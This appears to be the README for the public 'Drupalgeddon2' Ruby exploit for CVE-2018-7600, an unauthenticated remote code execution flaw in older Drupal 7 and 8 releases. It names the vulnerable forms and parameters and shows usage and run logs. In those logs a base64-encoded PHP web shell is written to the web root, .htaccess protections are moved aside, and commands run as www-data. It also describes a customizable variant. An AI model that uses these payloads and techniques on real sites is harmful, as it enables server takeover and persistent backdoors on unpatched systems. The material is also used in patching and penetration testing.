# CVE-2018-7600 | Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

[Drupalggedon2 ~ https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_

Supports:
- Drupal **< 8.3.9** / **< 8.4.6** / **< 8.5.1** ~ `user/register` URL, attacking `account/mail` & `#post_render` parameter, using PHP's `passthru` function
- Drupal **< 7.58** ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function
- **Direct commands** or Write a **PHP shell** to the web root (`./`) or sub-directories (`./sites/default/` & `./sites/default/files/`)
- **Windows** & **Linux** support

The `user/register` method was chosen for Drupal v8.x, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ _([More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708))_.

Authors:
- [Hans Topo](https://github.com/dreadlocked)  _([@\_dreadlocked](https://twitter.com/_dreadlocked))_
- [g0tmi1k](https://blog.g0tmi1k.com/) _([@g0tmi1k](https://twitter.com/g0tmi1k))_

Notes:
- For advance users/setups there is a more customizable exploit. See the `drupalgeddon2-customizable-beta` section.
- Before opening an issue, please, read the troubleshooting section at the end. Thanks!


- - -


## Usage:

```bash
$ ruby drupalgeddon2.rb
Usage: ruby drupalggedon2.rb <target>
       ruby drupalgeddon2.rb https://example.com
$
```


### Drupal v8.x Example

_Drupal v8.x < v8.3.9 / v8.4.x < v8.4.6 / v8.5.x < v8.5.1_

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-8/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-8/
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal-8/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://localhost/drupal-8/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal?: v8.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo TTTBJJBP
[+] Result : TTTBJJBP
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake shell:   curl 'http://localhost/drupal-8/s.php' -d 'c=hostname'
ubuntu140045x64-drupal>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ubuntu140045x64-drupal>>
ubuntu140045x64-drupal>> uname -a
Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ubuntu140045x64-drupal>>
```


### Drupal v7.x Example

_Drupal < v7.58_

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-7/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-7/
--------------------------------------------------------------------------------
[+] Found  : http://localhost/drupal-7/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.31
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo TKYPVVJJ
[+] Result : TKYPVVJJ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake shell:   curl 'http://localhost/drupal-7/s.php' -d 'c=hostname'

ubuntu140045x64-drupal>> uptime
 14:52:33 up 4 days,  3:35,  1 user,  load average: 0.00, 0.01, 0.05
ubuntu140045x64-drupal>>
ubuntu140045x64-drupal>> whoami
www-data
ubuntu140045x64-drupal>>
```


#### Direct Commands / Non PHP Shell (aka File-Less Method)

If either you do not want to even try and write a PHP web shell to the web server, edit the file as shown _(it will fall back if it can't find a writeable location anyway)_:

```ruby
writeshell = false
```

**Example**

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-nonwrite/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://localhost/drupal-nonwrite/
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal-nonwrite/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://localhost/drupal-nonwrite/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal?: v8.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[i] Payload: echo HYCBAIET
[+] Result : HYCBAIET
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [2] (HTTP Response: 404)...    Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [2] (HTTP Response: 404)...    Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root (sites/default/files/)
[i] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[!] Target is NOT exploitable for some reason [1] (HTTP Response: 403)...    May not be able to execute PHP from here?
[!] FAILED: Couldn't find writeable web path
--------------------------------------------------------------------------------
[*] Dropping back direct commands
drupalgeddon2>> lsb_release -a
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
drupalgeddon2>>
```


#### Proxy Support

For proxy support _(e.g. Burp)_, edit the file, replacing with your values. Example:

```ruby
proxy_addr = "192.168.0.130"
proxy_port = 8080
```


- - -


#### Experimental but usable: drupalgeddon2-customizable-beta

`drupalgeddon2-customizable-beta` is intended for more advance users as its more customizable. It allows you to specify some more parameters as the PHP method to use (not only `system()` or `passthru()`) and the way to reach user/password form.

Usage examples:

```
$ ruby drupalgeddon2-customizable-beta https://example.com 7 id passthru 0

1st parameter: Target URL
2nd parameter: Drupal version
3rd parameter: Command
4th parameter: PHP method to use (e.g. passthru, exec, system, assert...)
5th parameter: 0 for "/?q=user/password", 1 for "/user/password"
```


- - -


## Troubleshooting:

- Sometimes, websites may redirect to another path where Drupal exists (such as `30x` responses). Solution: Make sure you are using the correct Drupal path.
- Drupal v7.x - If `/user/password` form is disabled, maybe you should find another form, but remember to change the exploit. Solution: `form_id` parameter will change depending on the form used to exploit the vulnerability.


- - -


## Links:

- Drupal SA-CORE-2018-002 Advisory ~ https://www.drupal.org/sa-core-2018-002
- CVE ~ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
- Write up & Research ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
- cURL commands/sample PoC ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
